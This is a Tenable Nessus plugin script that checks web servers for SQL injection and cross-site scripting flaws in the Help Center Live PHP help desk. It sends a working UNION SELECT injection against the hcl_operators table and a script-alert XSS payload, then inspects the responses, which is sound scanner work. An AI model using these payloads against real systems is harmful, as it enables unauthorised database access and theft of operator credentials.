#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(18296);
  script_version("$Revision: 1.21 $");

  script_cve_id("CVE-2005-1672", "CVE-2005-1673", "CVE-2005-1674");
  script_bugtraq_id(13666, 13667);
  script_osvdb_id(
    16651,
    16652,
    16653,
    16654,
    16655,
    16656,
    16657,
    16658,
    20682
  );

  script_name(english:"Help Center Live Multiple Vulnerabilities (SQLi, XSS, CSRF)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Help Center Live, a help desk written in
PHP that suffers from multiple vulnerabilities:

  - Multiple SQL Injection Vulnerabilities
    The application fails in many cases to sanitize user-
    supplied input before using it in database queries. As
    long as PHP's 'magic_quotes_gpc' setting is 'off', an
    attacker can exploit these flaws to uncover sensitive
    information such as user's names and password hashes.

  - Multiple Cross-Site Scripting Vulnerabilities.
    There are several ways that an attacker can inject
    arbitrary HTML and script code into a user's browser
    via the affected application. By exploiting them, an
    attacker can not only steal cookies but also cause a
    logged-in admin to perform arbitrary requests.

  - A Cross-Site Request Forgery issue was reported
    in view.php." );
 # http://web.archive.org/web/20100904025851/http://www.gulftech.org/?node=research&article_id=00076-05172005
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6d22c288" );
 script_set_attribute(attribute:"solution", value:
"Contact the vendor for a patch." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/05/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/17");
 script_cvs_date("$Date: 2015/02/03 17:40:02 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  summary["english"] = "Checks for multiple vulnerabilities (2) in Help Center Live";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# For each CGI directory...
foreach dir (cgi_dirs()) {
  # Grab the faq.
  r = http_send_recv3(method: "GET", item:string(dir, "/faq/index.php"), port:port);
  if (isnull(r)) exit(0);

  # If it looks like Help Center Live...
  pat = '<a href="http://www\\.helpcenterlive\\.com".+>Help Center Live ([^<]+)</a>';
  if (egrep(string:r[2], pattern:pat, icase:TRUE)) {
    # Try a SQL injection.
    # nb: this requires magic_quotes_gpc to be off.
    r = http_send_recv3(method: "GET",
      item:string(
        dir, "/faq/index.php?",
        "x=f&",
        # nb: this returns a table with the NASL script name in one row and
        #     the operator's id in another if the application is vulnerable.
        "id=-99'%20UNION%20SELECT%200,0,'", SCRIPT_NAME, "',operator%20FROM%20hcl_operators%20WHERE%201--"
      ), 
      port:port
    );
    if (isnull(r)) exit(0);

    # There's a problem if we see the script name in a table.
    if (
      '<input type="submit" name="search" value="Search" /></td>' >< r[2] &&
      string('<td align="center" width="100%"><b>', SCRIPT_NAME, "</b></td>") >< r[2]
    ) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }

    # If that failed to pick up anything, try to exploit one of the XSS flaws.
    if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

    # A simple alert.
    xss = "<script>alert('" + SCRIPT_NAME + " was here');</script>";
    # nb: the url-encoded version is what we need to pass in.
    exss = "%3Cscript%3Ealert('" + SCRIPT_NAME + "%20was%20here')%3B%3C%2Fscript%3E";

    r = http_send_recv3(method: "GET",
      item:string(
        dir, "/faq/index.php?",
        'find=foo">', exss, "&",
        "search=Search"
      ), 
      port:port
    );
    if (isnull(r)) exit(0);

    # There's a problem if we see our XSS.
    if (xss >< r[2]) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
